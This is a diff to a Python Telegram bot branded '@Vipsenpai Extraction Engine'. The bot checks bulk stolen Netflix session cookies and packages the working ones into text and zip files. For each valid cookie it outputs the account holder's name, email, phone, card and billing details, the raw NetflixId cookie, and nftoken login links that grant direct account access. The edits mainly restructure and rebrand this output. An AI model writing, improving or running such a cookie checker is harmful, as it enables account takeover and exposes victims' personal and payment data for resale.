@@ -304,18 +304,15 @@ def process_netflix_cookie_pipeline(netflix_id):
     return token, info
 
 # ══════════════════════════════════════════════════════════════════════
-#  MULTIPLEX ROUTER DISPATCH MANAGEMENT (FIXED METADATA CROSS-DEDUPLICATION)
+#  MULTIPLEX ROUTER DISPATCH MANAGEMENT
 # ══════════════════════════════════════════════════════════════════════
 
 def process_pipeline_core(message, input_data_map, is_file_mode=False, is_zip_mode=False):
     """Core running pipeline executing strict identity context checking constraints."""
     
-    # Global verification locksets
     seen_emails_lock = set()
     stats = {"hits": 0, "failed": 0, "filtered": 0, "checked": 0, "duplicates": 0, "hit_index": 1}
     stats_lock = threading.Lock()
-    
-    master_buffer = io.StringIO()
     valid_cookie_details_map = {} 
 
     # ─── SECTION 1: ZIP ARCHIVE PACKAGE MANAGER ARCHITECTURE ───
@@ -369,7 +366,6 @@ def process_pipeline_core(message, input_data_map, is_file_mode=False, is_zip_mo
                 account_name = str(details.get("name") or "").strip().lower()
                 identity_signature = email_key if (email_key and email_key != "n/a") else account_name
 
-                # SURGICAL LAYER CHANGE: Drops cross-token copies pointing to identical profile nodes
                 with stats_lock:
                     if identity_signature in seen_emails_lock:
                         stats["checked"] += 1
@@ -417,13 +413,12 @@ def process_pipeline_core(message, input_data_map, is_file_mode=False, is_zip_mo
                         f"✅ Email Verified: {details.get('email_verified') or 'Yes'}\n"
                         f"🛡️ Membership Status: {details.get('membership_status') or 'CURRENT_MEMBER'}\n"
                         f"🎭 Profiles ({p_count}): {profiles_list}\n\n"
-                        f"✅  COOKIE: NetflixId={current_cookie}\n\n"
+                        f"✅ COOKIE: NetflixId={current_cookie}\n\n"
                         f"📱 Phone Login:\nhttps://www.netflix.com/unsupported?nftoken={token}\n\n"
                         f"🖥️ PC Login:\nhttps://www.netflix.com/account?nftoken={token}\n\n"
                         f"🔑 Login Link:\nhttps://www.netflix.com/login?nftoken={token}\n\n"
-                        f"⏳ Token Expiry: {details.get('token_expiry')}\n"
-                        f"❖ @Vipsenpai Extraction Engine\n"
-                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+                        f"⏳ Token Expiry: {details.get('token_expiry')}\n\n"
+                        f"❖ @Vipsenpai Extraction Engine\n\n"
                     )
                     valid_cookie_details_map[current_cookie] = block_out
 
@@ -455,17 +450,19 @@ def process_pipeline_core(message, input_data_map, is_file_mode=False, is_zip_mo
         )
 
         if stats['hits'] > 0 or stats['filtered'] > 0:
+            master_buffer = io.StringIO()
             for cookie in aggregated_unique_cookies:
                 if cookie in valid_cookie_details_map:
-                    master_buffer.write(f"-----------------CHECKED - {stats['hit_index']}-----------------\n")
+                    master_buffer.write(f"-----------------@VipSenpai • CHECKED - {stats['hit_index']}-----------------\n\n")
                     master_buffer.write(valid_cookie_details_map[cookie])
+                    master_buffer.write("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
                     stats['hit_index'] += 1
             
             master_bytes = master_buffer.getvalue().encode('utf-8')
             master_buffer.close()
             
             master_file_payload = io.BytesIO(master_bytes)
-            master_file_payload.name = f"All_Combined_Results_{datetime.now().strftime('%d_%m_%Y')}.txt"
+            master_file_payload.name = f"All_Combined_@VipSenpai_Cookie_{datetime.now().strftime('%d_%m_%Y')}.txt"
             bot.send_document(chat_id=message.chat.id, document=master_file_payload, caption="📝 <b>All Unique Combined Results Text Log File</b>")
 
             zip_buffer = io.BytesIO()
@@ -475,8 +472,9 @@ def process_pipeline_core(message, input_data_map, is_file_mode=False, is_zip_mo
                     sub_hit_index = 1
                     for cookie in cookie_list:
                         if cookie in valid_cookie_details_map:
-                            sub_file_content.write(f"-----------------CHECKED - {sub_hit_index}-----------------\n")
+                            sub_file_content.write(f"-----------------@VipSenpai • CHECKED - {sub_hit_index}-----------------\n\n")
                             sub_file_content.write(valid_cookie_details_map[cookie])
+                            sub_file_content.write("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
                             sub_hit_index += 1
                     
                     final_sub_text = sub_file_content.getvalue()
@@ -487,7 +485,7 @@ def process_pipeline_core(message, input_data_map, is_file_mode=False, is_zip_mo
                         output_zip.writestr(f"Checked_{clean_fn}", final_sub_text)
 
             zip_buffer.seek(0)
-            zip_buffer.name = f"Checked_Files_Package_{datetime.now().strftime('%d_%m_%Y')}.zip"
+            zip_buffer.name = f"Checked_@VipSenpai_Cookie_{datetime.now().strftime('%d_%m_%Y')}.zip"
             bot.send_document(chat_id=message.chat.id, document=zip_buffer, caption=final_summary_report)
         else:
             bot.send_message(chat_id=message.chat.id, text=final_summary_report + "\n\n[!] No active elements salvaged from compressed package.")
@@ -521,7 +519,6 @@ def process_pipeline_core(message, input_data_map, is_file_mode=False, is_zip_mo
                 account_name = str(details.get("name") or "").strip().lower()
                 identity_signature = email_key if (email_key and email_key != "n/a") else account_name
 
-                # Drops matching account clones dynamically
                 with stats_lock:
                     if identity_signature in seen_emails_lock:
                         stats["checked"] += 1
@@ -551,35 +548,34 @@ def process_pipeline_core(message, input_data_map, is_file_mode=False, is_zip_mo
                     profiles_list = details.get("profiles") or "lucky, Guest"
                     p_count = len(str(profiles_list).split(","))
 
-                    output_text_buffer.write(f"-----------------@VipSenpai • CHECKED - {stats['hit_index']}-----------------\n\n")
-                    output_text_buffer.write(f"📌 Status: {status}\n")
-                    output_text_buffer.write(f"👤 Name: {details.get('name') or 'N/A'}\n")
-                    output_text_buffer.write(f"📧 Email: {details.get('email') or 'N/A'}\n")
-                    output_text_buffer.write(f"🌍 Country: {details.get('country') or 'US'} {country_code_to_flag(details.get('country'))}\n")
-                    output_text_buffer.write(f"📦 Plan: {plan_name or derived_plan}\n")
-                    output_text_buffer.write(f"📅 Member Since: {details.get('member_since') or 'Unknown'}\n")
-                    output_text_buffer.write(f"🗓️ Next Billing: {details.get('next_billing') or 'Unknown'}\n")
-                    output_text_buffer.write(f"💳 Payment: {details.get('payment') or 'CC'}\n")
-                    output_text_buffer.write(f"💳 Card: {card}\n")
-                    output_text_buffer.write(f"📱 Phone: {details.get('phone') or 'None'}\n")
-                    output_text_buffer.write(f"🎞️ Quality: {details.get('quality') or derived_quality}\n")
-                    output_text_buffer.write(f"📺 Streams: {details.get('streams') or derived_streams}\n")
-                    output_text_buffer.write(f"💰 Price: {derived_price}\n")
-                    output_text_buffer.write(f"⏸️ Hold Status: {details.get('hold') or 'No'}\n")
-                    output_text_buffer.write(f"✅ Email Verified: {details.get('email_verified') or 'Yes'}\n")
-                    output_text_buffer.write(f"🛡️ Membership Status: {details.get('membership_status') or 'CURRENT_MEMBER'}\n")
-                    output_text_buffer.write(f"🎭 Profiles ({p_count}): {profiles_list}\n\n")
-                    output_text_buffer.write(f"✅  COOKIE: NetflixId={current_cookie}\n\n")
-                    output_text_buffer.write(f"📱 Phone Login:\nhttps://www.netflix.com/unsupported?nftoken={token}\n\n")
-                    output_text_buffer.write(f"🖥️ PC Login:\nhttps://www.netflix.com/account?nftoken={token}\n\n")
-                    output_text_buffer.write(f"🔑 Login Link:\nhttps://www.netflix.com/login?nftoken={token}\n\n")
-                    output_text_buffer.write(f"⏳ Token Expiry: {details.get('token_expiry')}\n\n\n")
-                    output_text_buffer.write(f"❖ {WATERMARK}\n\n\n")
-                    stats["hit_index"] += 1
+                    block_out = (
+                        f"📌 Status: {status}\n"
+                        f"👤 Name: {details.get('name') or 'N/A'}\n"
+                        f"📧 Email: {details.get('email') or 'N/A'}\n"
+                        f"🌍 Country: {details.get('country') or 'US'} {country_code_to_flag(details.get('country'))}\n"
+                        f"📦 Plan: {plan_name or derived_plan}\n"
+                        f"📅 Member Since: {details.get('member_since') or 'Unknown'}\n"
+                        f"🗓️ Next Billing: {details.get('next_billing') or 'Unknown'}\n"
+                        f"💳 Payment: {details.get('payment') or 'CC'}\n"
+                        f"💳 Card: {card}\n"
+                        f"📱 Phone: {details.get('phone') or 'None'}\n"
+                        f"🎞️ Quality: {details.get('quality') or derived_quality}\n"
+                        f"📺 Streams: {details.get('streams') or derived_streams}\n"
+                        f"💰 Price: {derived_price}\n"
+                        f"⏸️ Hold Status: {details.get('hold') or 'No'}\n"
+                        f"✅ Email Verified: {details.get('email_verified') or 'Yes'}\n"
+                        f"🛡️ Membership Status: {details.get('membership_status') or 'CURRENT_MEMBER'}\n"
+                        f"🎭 Profiles ({p_count}): {profiles_list}\n\n"
+                        f"✅ COOKIE: NetflixId={current_cookie}\n\n"
+                        f"📱 Phone Login:\nhttps://www.netflix.com/unsupported?nftoken={token}\n\n"
+                        f"🖥️ PC Login:\nhttps://www.netflix.com/account?nftoken={token}\n\n"
+                        f"🔑 Login Link:\nhttps://www.netflix.com/login?nftoken={token}\n\n"
+                        f"⏳ Token Expiry: {details.get('token_expiry')}\n\n"
+                        f"❖ {WATERMARK}\n\n"
+                    )
+                    valid_cookie_details_map[current_cookie] = block_out
 
-                now = time.time()
-                if now - last_update_time[0] >= 1.5 or stats["checked"] == total_cookies:
-                    last_update_time[0] = now
+                if stats["checked"] % 2 == 0 or stats["checked"] == total_cookies:
                     polling_msg = (
                         f"🔍 <b>Checking Logs:</b> {stats['checked']}/{total_cookies}\n"
                         f"✅ <b>Hits:</b> {stats['hits']} | ❌ <b>Failed:</b> {stats['failed']} | 🚫 <b>Filtered:</b> {stats['filtered']}\n"
@@ -607,10 +603,18 @@ def process_pipeline_core(message, input_data_map, is_file_mode=False, is_zip_mo
         )
         
         if stats['hits'] > 0 or stats['filtered'] > 0:
+            output_text_buffer = io.StringIO()
+            for cookie in initial_unique_cookies:
+                if cookie in valid_cookie_details_map:
+                    output_text_buffer.write(f"-----------------@VipSenpai • CHECKED - {stats['hit_index']}-----------------\n\n")
+                    output_text_buffer.write(valid_cookie_details_map[cookie])
+                    output_text_buffer.write("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
+                    stats['hit_index'] += 1
+                    
             result_bytes = output_text_buffer.getvalue().encode('utf-8')
             output_text_buffer.close()
             file_payload = io.BytesIO(result_bytes)
-            file_payload.name = f"Checked_Results_{datetime.now().strftime('%d_%m_%Y')}.txt"
+            file_payload.name = f"Checked_@VipSenpai_Results_{datetime.now().strftime('%d_%m_%Y')}.txt"
             bot.send_document(chat_id=message.chat.id, document=file_payload, caption=final_summary_report)
         else:
             bot.send_message(chat_id=message.chat.id, text=final_summary_report + "\n\n[!] No active cookies gathered.")
